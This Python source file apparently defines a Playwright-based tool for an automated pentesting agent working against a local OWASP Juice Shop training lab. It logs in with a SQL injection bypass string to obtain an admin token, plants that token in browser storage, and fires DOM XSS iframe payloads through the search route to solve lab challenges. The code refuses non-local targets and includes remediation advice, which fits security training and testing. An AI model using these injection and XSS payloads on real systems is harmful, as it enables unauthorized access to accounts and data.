"""Browser-aware Juice Shop exploration with Playwright."""

from __future__ import annotations

import os
from pathlib import Path
from typing import Any
from urllib.parse import quote

import httpx
from pydantic import BaseModel, Field

from .base import tool


class BrowserExplorerParams(BaseModel):
    include_xss: bool = Field(
        default=True,
        description="Trigger browser-only DOM XSS training payloads in the local lab.",
    )
    include_web3: bool = Field(
        default=True,
        description="Visit the local web3 sandbox route when unsolved. This stays on localhost.",
    )
    screenshot_dir: str = Field(
        default="reports/browser_evidence",
        description="Directory where browser screenshots should be saved.",
    )


def _target() -> str:
    return os.environ.get("TARGET_URL", "http://localhost:3000").rstrip("/")


def _challenge_names(client: httpx.Client) -> set[str]:
    response = client.get("/api/Challenges/", timeout=10.0)
    response.raise_for_status()
    data = response.json().get("data", [])
    return {item.get("name", "") for item in data if item.get("solved")}


def _admin_token(client: httpx.Client) -> tuple[str | None, int | None]:
    try:
        response = client.post(
            "/rest/user/login",
            json={"email": "' or 1=1--", "password": "browser"},
            timeout=10.0,
        )
        data = response.json().get("authentication", {})
        return data.get("token"), data.get("bid")
    except Exception:
        return None, None


@tool(
    name="browser_explorer",
    description=(
        "Use Playwright against the local Juice Shop target to visit Angular routes, "
        "preserve an authenticated browser session, trigger browser-only challenge "
        "workflows, and save screenshots/textual evidence."
    ),
    params=BrowserExplorerParams,
)
def browser_explorer(
    include_xss: bool = True,
    include_web3: bool = True,
    screenshot_dir: str = "reports/browser_evidence",
) -> dict[str, Any]:
    try:
        from playwright.sync_api import sync_playwright
    except Exception as exc:
        return {
            "error": (
                f"Playwright is not installed or importable: {type(exc).__name__}: {exc}. "
                "Install with: .\\.venv\\Scripts\\python.exe -m pip install playwright; "
                ".\\.venv\\Scripts\\python.exe -m playwright install chromium"
            )
        }

    target = _target()
    if not target.startswith(("http://localhost", "http://127.0.0.1", "http://[::1]")):
        return {"error": f"browser_explorer refuses non-local target: {target}"}

    evidence_dir = Path(screenshot_dir)
    evidence_dir.mkdir(parents=True, exist_ok=True)

    http = httpx.Client(base_url=target, follow_redirects=True, timeout=15.0)
    solved_before = _challenge_names(http)
    actions: list[dict[str, Any]] = []
    screenshots: list[str] = []
    dialogs: list[str] = []

    token, bid = _admin_token(http)
    route_specs = [
        ("score_board_route", "/#/score-board"),
        ("privacy_policy_route", "/#/privacy-security/privacy-policy"),
        ("admin_route", "/#/administration"),
    ]
    if include_web3 and "Web3 Sandbox" not in solved_before:
        route_specs.append(("web3_sandbox_route", "/#/web3-sandbox"))

    try:
        with sync_playwright() as playwright:
            browser = playwright.chromium.launch(headless=True)
            page = browser.new_page(viewport={"width": 1366, "height": 900})
            page.on("dialog", lambda dialog: (dialogs.append(dialog.message), dialog.accept()))
            page.goto(target, wait_until="networkidle", timeout=30000)
            if token:
                page.evaluate(
                    """([token, bid]) => {
                        localStorage.setItem("token", token);
                        if (bid !== null && bid !== undefined) {
                            sessionStorage.setItem("bid", String(bid));
                        }
                    }""",
                    [token, bid],
                )

            for name, route in route_specs:
                before = _challenge_names(http)
                try:
                    page.goto(target + route, wait_until="networkidle", timeout=30000)
                    page.wait_for_timeout(1200)
                    shot = evidence_dir / f"{name}.png"
                    page.screenshot(path=str(shot), full_page=True)
                    screenshots.append(str(shot))
                    after = _challenge_names(http)
                    actions.append(
                        {
                            "action": name,
                            "route": route,
                            "newly_solved": sorted(after - before),
                            "evidence_path": str(shot),
                            "visible_text_excerpt": page.locator("body").inner_text(timeout=3000)[:500],
                        }
                    )
                except Exception as exc:
                    actions.append(
                        {
                            "action": name,
                            "route": route,
                            "error": f"{type(exc).__name__}: {exc}",
                        }
                    )

            if include_xss:
                payload = '<iframe src="javascript:alert(`xss`)">'
                before = _challenge_names(http)
                try:
                    page.goto(target + "/#/search?q=" + quote(payload), wait_until="networkidle", timeout=30000)
                    page.wait_for_timeout(2000)
                    shot = evidence_dir / "dom_xss.png"
                    page.screenshot(path=str(shot), full_page=True)
                    after = _challenge_names(http)
                    actions.append(
                        {
                            "action": "dom_xss_payload",
                            "route": "/#/search",
                            "payload": payload,
                            "dialogs": dialogs[-3:],
                            "newly_solved": sorted(after - before),
                            "evidence_path": str(shot),
                        }
                    )
                    screenshots.append(str(shot))
                except Exception as exc:
                    actions.append({"action": "dom_xss_payload", "error": f"{type(exc).__name__}: {exc}"})

                bonus_payload = (
                    '<iframe width="100%" height="166" scrolling="no" frameborder="no" '
                    'allow="autoplay" src="https://w.soundcloud.com/player/?url=https%3A//'
                    'api.soundcloud.com/tracks/771984076&color=%23ff5500&auto_play=true'
                    '&hide_related=false&show_comments=true&show_user=true&show_reposts=false'
                    '&show_teaser=true"></iframe>'
                )
                before = _challenge_names(http)
                try:
                    page.goto(
                        target + "/#/search?q=" + quote(bonus_payload),
                        wait_until="networkidle",
                        timeout=30000,
                    )
                    page.wait_for_timeout(2000)
                    shot = evidence_dir / "bonus_payload.png"
                    page.screenshot(path=str(shot), full_page=True)
                    after = _challenge_names(http)
                    actions.append(
                        {
                            "action": "bonus_dom_payload",
                            "route": "/#/search",
                            "newly_solved": sorted(after - before),
                            "evidence_path": str(shot),
                        }
                    )
                    screenshots.append(str(shot))
                except Exception as exc:
                    actions.append({"action": "bonus_dom_payload", "error": f"{type(exc).__name__}: {exc}"})

            browser.close()
    except Exception as exc:
        return {
            "error": f"Playwright browser run failed: {type(exc).__name__}: {exc}",
            "actions": actions,
            "screenshots": screenshots,
        }

    solved_after = _challenge_names(http)
    newly_solved = sorted(solved_after - solved_before)
    return {
        "phase": "browser_exploration",
        "solved_before": len(solved_before),
        "solved_after": len(solved_after),
        "newly_solved": newly_solved,
        "actions": actions,
        "screenshots": screenshots,
        "dialogs": dialogs,
        "findings": [
            {
                "title": "Browser-only Juice Shop workflows are exploitable",
                "severity": "Medium",
                "endpoint": "Angular routes and browser-rendered search",
                "evidence": {
                    "newly_solved": newly_solved,
                    "screenshots": screenshots,
                    "dialogs": dialogs,
                },
                "reproduction": (
                    "Run browser_explorer against the local target to visit the recorded "
                    "routes and DOM payload URLs."
                ),
                "remediation": (
                    "Avoid rendering untrusted route/search data as executable HTML and "
                    "protect privileged Angular routes with server-side authorization."
                ),
            }
        ],
        "summary": (
            f"Browser explorer completed {len(actions)} actions; "
            f"{len(newly_solved)} new challenges solved."
        ),
    }
